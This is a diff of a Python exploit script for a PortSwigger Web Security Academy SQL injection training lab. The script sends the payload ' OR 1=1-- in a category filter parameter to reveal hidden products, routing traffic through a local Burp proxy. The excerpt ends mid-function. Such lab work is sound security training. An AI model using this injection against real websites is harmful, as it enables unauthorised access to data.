@@ -2,6 +2,7 @@
 
 """
 Python script for Web-Security-Academy SQLi lab 01
+Lab URL: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
 SYNOPSIS
 ========
@@ -13,20 +14,21 @@ SYNOPSIS
 DESCRIPTION
 ===========
 SQLi exploit script used to retrieve hidden data.
-paylod used in Burp Repeater
-' OR 1=1--
-GET /filter?category=Accessories'+OR+1%3d1--
+    - the URL and the SQLi paylod 
+    - takes those two parameters/arguments
+Payload: ' OR 1=1--
+GET /filter?category=Accessories' OR 1=1--
 
 """
 import requests
 import sys
 import urllib3
-# disable insecure request warning
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# Disable insecure request warning & run requests through Burp Suite's proxy'
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def exploit_sqli(url, payload):
+def exploit_sqli(url, payload: object) -> None:
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
     if "Cat Grin" in r.text:
